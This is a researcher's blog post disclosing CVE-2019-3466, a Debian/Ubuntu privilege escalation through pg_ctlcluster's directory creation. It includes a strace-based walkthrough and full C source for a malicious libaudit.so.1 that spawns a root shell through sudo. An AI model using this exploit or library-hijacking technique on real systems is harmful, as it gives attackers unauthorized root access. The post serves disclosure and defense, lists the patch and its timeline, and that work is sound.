![](https://pixel.wp.com/b.gif?v=noscript)



=== Content from blog.mirch.io_f0336b0b_20250121_014557.html ===

[Skip to content](#content)

* [Home](/)
* [Vulnerability Research](https://blog.mirch.io/cve/)
* [Github](https://github.com/mirchr/security-research)
* [Twitter](https://twitter.com/0xm1rch)
* [About](https://blog.mirch.io/about/)

Search for:

[Rich Mirch](https://blog.mirch.io "Rich Mirch")
# [Rich Mirch](https://blog.mirch.io/ "Rich Mirch")

## Penetration Tester, Red Teamer, Security Researcher

Menu

[CVE-2019-3466 Debian / Ubuntu Privilege Escalation via¬†pg\_ctlcluster ‚Äî November 15, 2019](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/ "CVE-2019-3466 Debian / Ubuntu Privilege Escalation via¬†pg_ctlcluster")

[![](https://blog.mirch.io/wp-content/uploads/2019/11/debian-buster-postgres-root.png?w=712)](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/ "CVE-2019-3466 Debian / Ubuntu Privilege Escalation via¬†pg_ctlcluster")

## [CVE-2019-3466 Debian / Ubuntu Privilege Escalation via¬†pg\_ctlcluster](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/)

[November 15, 2019November 15, 2019](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/ "6:54 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

# Vulnerability Summary

The [pg\_ctlcluster](https://manpages.debian.org/buster/postgresql-common/pg_ctlcluster.1.en.html) script in the postgresql-common package in Debian and Ubuntu is vulnerable to a local privilege escalation attack. pg\_ctlcluster is a script used to manage PostgreSQL instances.¬†A malicious actor with access to the postgres account can create arbitrary directories during startup or reload when called via systemd. This vulnerability can be leveraged to escalate privileges to root.

It‚Äôs important to note this is not a vulnerability in PostgreSQL and is specific to Debian, Ubuntu, or any system that consumes the Debian postgresql-common package.

A [fix](https://salsa.debian.org/postgresql/postgresql-common/commit/ec9d984b62ed79f61be97b786a9ff4381309979c)¬†is now available. Administrators should upgrade to the latest version of the postgresql-common package. See the Debian [security tracker](https://security-tracker.debian.org/tracker/source-package/postgresql-common) for details.

The vulnerability appears to have existed since 2013 based on the Debian Git history ([9dc97b,](https://salsa.debian.org/postgresql/postgresql-common/commit/9dc97be33f1f116ae6e2f17bd05cb6a2baf274a9)¬†[e97d16](https://salsa.debian.org/postgresql/postgresql-common/commit/e97d163c85c6df7e30ecc346eec007da2cd7e688)). I attempted to reproduce it on Wheezy but was unable to verify it due to unrelated technical issues standing up a test environment.

This proof of concept will show the ability to gain root privileges using the default

installation of¬† postgresql-common v200+deb10u2 along with postgresql-11 on Debian Buster. I have also verified the vulnerability on Ubuntu 19.04 with version 199 of the postgresql-common package.

---

## Walkthrough

The postgresql init script(/etc/init.d/postgresql) sources¬†[init.d-functions](https://salsa.debian.org/postgresql/postgresql-common/blob/master/debian/init.d-functions) which contain functions that call the pg\_ctlcluster script.¬†pg\_ctlcluster loads the following configuration files determined by the [Pgcommon](https://salsa.debian.org/postgresql/postgresql-common/blob/master/PgCommon.pm)¬†module.

* /etc/postgresql/cluster-version/cluster-name/pg\_ctl.conf
* /etc/postgresql/cluster-version/cluster-name/postgresql.conf
* /var/lib/postgresql/cluster-version/cluster-name/postgresql.auto.conf

These files are owned by the postgres user. The postgresql.auto.conf file will override the settings from /etc/postgresql. This file is created when the [alter system](https://www.postgresql.org/docs/current/sql-altersystem.html) command is executed.

pg\_ctlcluster contains logic to create directories for socketdir(defined in pg\_ctl.conf) and stats\_temp\_directory(defined in postgresql.conf). During a start or reload, if the directories defined in either of these variables do not exist, pg\_ctlcluster will create it and set the owner to the postgres user.

![debian-200-deb10u2-vuln-code](https://blog.mirch.io/wp-content/uploads/2019/11/debian-200-deb10u2-vuln-code.png?w=712)

Vulnerable code in 200+deb10u2

With the ability to create an arbitrary directory owned by the postgres user I set out to find a fast path to root. I executed the [strace(1)](http://man7.org/linux/man-pages/man1/strace.1.html)¬†utility on the sudo binary to see if there were any attempts to load shared objects from nonexistent locations.

```
postgres@debian:~$ strace -ff sudo 2>&1|grep '.so.' |grep -w ENOENT
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/tls/haswell/x86_64/libaudit.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/tls/haswell/libaudit.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/tls/x86_64/libaudit.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/tls/libaudit.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/haswell/x86_64/libaudit.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/haswell/libaudit.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/x86_64/libaudit.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/libaudit.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/libselinux.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/libutil.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/libpthread.so.0", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/libdl.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/libc.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)

```

I reviewed the list and decided that /usr/lib/sudo/haswell would be a good candidate.

```
postgres@debian:~$ ls -ld /usr/lib/sudo/haswell
ls: cannot access '/usr/lib/sudo/haswell': No such file or directory
```

At this point we have a privileged binary(sudo) attempting to load /usr/lib/sudo/haswell/libaudit.so.1 from a path does not exist. The goal now was to create this path, install a malicious libaudit.so.1 library and execute sudo. If all goes well a root shell will be spawned.

For the purpose of a simple PoC, I created a sudo rule to quickly restart the postgres service via systemd to demonstrate the vulnerability. In the real world this rule probably will not exist under the postgres account, however there could be other methods to induce a restart. Worse case an attacker would have to wait until the system was rebooted or some other event to cause the service to restart via systemd.

I automated the process by creating two scripts which can be found in my [Github](https://github.com/mirchr/security-research) repo. [CVE-2019-3466-stage1.sh](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2019-3466-stage1.sh) sets stats\_temp\_directory to /usr/lib/sudo/haswell. After a restart, [CVE-2019-3466-stage2.sh](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2019-3466-stage2.sh) builds a malicious libaudit.so.1 library,¬† stores it in /usr/lib/sudo/haswell, and executes sudo which spawns a root shell. Below is the source for libaudit.so.1 library. I had to add stubs for audit\_open() and audit\_log\_user\_message().

**Note:**¬†This has the potential to break sudo and should only be used in a controlled test environment. No attempt was made to make it reliable so use with caution.

```

/*
 * Author: Rich Mirch @0xm1rch
 * PoC for pg_ctlcluster arbitrary directory creation
 * gcc -fPIC -o woot.o -Wall -c woot.c
 * gcc -Wall -shared \
 *     -Wl,-soname,libaudit.so.1 \
 *     -Wl,-init,woot \
 *     -o /usr/lib/sudo/haswell/libaudit.so.1 woot.o
 * sudo
 */
#include
#include
#include

void audit_open()
{
  return;
}

void audit_log_user_message()
{
  return;
}

void woot(){
  setreuid(0,0);
  setregid(0,0);
  execl("/bin/sh","/bin/sh",NULL);
}

```

Screenshot showing the execution of stage 1, a restart, and stage 2 resulting in a root shell.

![debian-buster-postgres-root](https://blog.mirch.io/wp-content/uploads/2019/11/debian-buster-postgres-root.png?w=712)

## Timeline

* 2019-10-13: Report sent to Debian Security Team
* 2019-10-14: Debian acknowledges report
* 2019-11-13: Debian notified Ubuntu about upcoming release
* 2019-11-14: Debian releases advisory and patch

## References

* Debian Advisory: <https://www.debian.org/security/2019/dsa-4568>
* Ubuntu Advisory: <https://usn.ubuntu.com/4194-1/>
* PoC Exploit: [CVE-2019-3466-stage1.sh](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2019-3466-stage1.sh),¬†[CVE-2019-3466-stage2.sh](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2019-3466-stage2.sh)

### Share this:

* [Twitter](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/?share=twitter "Click to share on Twitter")
* [Facebook](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/?share=facebook "Click to share on Facebook")
Like Loading...
### *Related*

Categories: [Uncategorized](https://blog.mirch.io/category/uncategorized/)Tags: [Linux](https://blog.mirch.io/tag/linux/), [PostgreSQL](https://blog.mirch.io/tag/postgresql/), [vulnerability](https://blog.mirch.io/tag/vulnerability/)

## Post navigation

[CVE-2018-1792 ‚Äì IBM MQ Privilege Escalation: Fun with¬†RUNPATH](https://blog.mirch.io/2019/08/25/cve-2018-1792-ibm-mq-privilege-escalation-fun-with-runpath/)[CVE-2019-19954 Signal Desktop Windows Elevation of Privilege¬†Vulnerability](https://blog.mirch.io/2019/12/18/signal-desktop-windows-lpe/)

### Tags

[exploit](https://blog.mirch.io/tag/exploit/)
[hacking sudo](https://blog.mirch.io/tag/hacking-sudo/)
[Linux](https://blog.mirch.io/tag/linux/)
[PostgreSQL](https://blog.mirch.io/tag/postgresql/)
[sudo hacking](https://blog.mirch.io/tag/sudo-hacking/)
[vulnerability](https://blog.mirch.io/tag/vulnerability/)
[Follow Rich Mirch on WordPress.com](https://blog.mirch.io)

* [GitHub](https://github.com/mirchr)
* [LinkedIn](https://www.linkedin.com/in/mirchr/)

[Create a website or blog at WordPress.com](https://wordpress.com/?ref=footer_custom_svg "Create a website or blog at WordPress.com")

* Reblog
* Subscribe
  Subscribed

  + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Rich Mirch](https://blog.mirch.io)

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fblog.mirch.io%252F2019%252F11%252F15%252Fcve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation%252F)
* Privacy
* + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Rich Mirch](https://blog.mirch.io)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fblog.mirch.io%252F2019%252F11%252F15%252Fcve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation%252F)
  + [Copy shortlink](https://wp.me/paoR5j-5n)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/)
  + [View post in Reader](https://wordpress.com/read/blogs/153687293/posts/333)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

##

##

Loading Comments...

Write a Comment...

Email (Required)

Name (Required)

Website

###

%d

![](https://pixel.wp.com/b.gif?v=noscript)


